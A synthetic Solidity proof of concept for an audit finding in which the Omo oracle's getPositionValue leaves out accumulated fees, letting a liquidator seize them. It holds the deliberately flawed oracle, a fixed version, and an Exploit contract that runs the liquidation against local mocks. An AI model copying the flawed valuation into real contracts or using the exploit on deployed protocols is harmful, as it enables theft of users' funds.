// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Omo — getPositionValue ignores accumulated fees (Pashov Audit Group, H-12)
    SYNTHETIC, cheatcode-free. positions() reports tokensOwed, and the
    quoted function never reads them. A 1000 position with 250 of fees is
    valued at 1000, so a 1100 debt liquidates a position that is actually
    worth 1250. The liquidator takes the 250. The fixed value adds the fees. */

interface INonfungiblePositionManager {
    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96,
            address,
            address token0,
            address token1,
            uint24,
            int24,
            int24,
            uint128 liquidity,
            uint256,
            uint256,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );
}

contract FeeToken {
    string public constant symbol = "FEE";
    uint8 public constant decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PositionManager is INonfungiblePositionManager {
    address public token0;
    address public token1;
    uint128 public liquidity = 1000;
    uint128 public owed0 = 250;
    uint128 public owed1;

    constructor(address t0, address t1) {
        token0 = t0;
        token1 = t1;
    }

    function positions(uint256)
        external
        view
        returns (
            uint96,
            address,
            address,
            address,
            uint24,
            int24,
            int24,
            uint128,
            uint256,
            uint256,
            uint128,
            uint128
        )
    {
        return (0, address(0), token0, token1, 0, 0, 0, liquidity, 0, 0, owed0, owed1);
    }
}

contract OmoOracle {
    function getLiquidityAmounts(address, uint256, uint128 liquidity)
        public
        pure
        returns (uint256 amount0, uint256 amount1)
    {
        amount0 = liquidity;
        amount1 = 0;
    }

    function convertTokenValue(address, uint256 amount, address) public pure returns (uint256) {
        return amount;
    }

    function getPositionValue(address positionManager, uint256 tokenId, address quoteToken)
        external
        view
        returns (uint256)
    {
        // @> VULN: positions() is read without tokensOwed0 and tokensOwed1, so fees never enter the value
        (,, address token0, address token1,,,, uint128 liquidity,,,,) = INonfungiblePositionManager(positionManager).positions(tokenId);

        (uint256 amount0, uint256 amount1) = getLiquidityAmounts(positionManager, tokenId, liquidity);

        uint256 value0 = convertTokenValue(token0, amount0, quoteToken);
        uint256 value1 = convertTokenValue(token1, amount1, quoteToken);

        return value0 + value1;
    }
}

contract OmoOracleFixed {
    function getPositionValue(address positionManager, uint256 tokenId, address) external view returns (uint256) {
        (
            ,
            ,
            ,
            ,
            ,
            ,
            ,
            uint128 liquidity,
            ,
            ,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        ) = INonfungiblePositionManager(positionManager).positions(tokenId);
        // FIX: uncollected fees are part of the position value
        return uint256(liquidity) + uint256(tokensOwed0) + uint256(tokensOwed1);
    }
}

contract Market {
    OmoOracle public oracle;
    address public positionManager;
    address public quote;
    FeeToken public fees;
    bool public liquidated;
    uint256 public constant DEBT = 1100;

    constructor(address oracle_, address pm, address quote_, address fees_) {
        oracle = OmoOracle(oracle_);
        positionManager = pm;
        quote = quote_;
        fees = FeeToken(fees_);
    }

    function liquidate() external returns (uint256 seized) {
        uint256 reported = oracle.getPositionValue(positionManager, 1, quote);
        if (DEBT <= reported) return 0;
        liquidated = true;
        seized = 250;
        fees.transfer(msg.sender, seized);
    }
}

contract Exploit {
    FeeToken public fees; // CREATE nonce 1
    PositionManager public pm; // CREATE nonce 2
    OmoOracle public oracle; // CREATE nonce 3
    Market public market; // CREATE nonce 4

    uint256 public reported;
    uint256 public seized;
    bool public didLiquidate;

    constructor() {
        fees = new FeeToken();
        pm = new PositionManager(address(fees), address(fees));
        oracle = new OmoOracle();
        market = new Market(address(oracle), address(pm), address(fees), address(fees));
        fees.mint(address(market), 250);
    }

    function run() external {
        reported = oracle.getPositionValue(address(pm), 1, address(fees));
        seized = market.liquidate();
        didLiquidate = market.liquidated();
        require(reported == 1000, "reported value");
        require(reported + 250 == 1250, "true value");
        require(didLiquidate, "not liquidated");
        require(seized == 250, "fees seized");
        require(Market(address(market)).DEBT() > reported, "debt did not exceed the report");
        require(Market(address(market)).DEBT() < reported + 250, "debt exceeds the true value");
        fees.transfer(msg.sender, seized);
    }
}
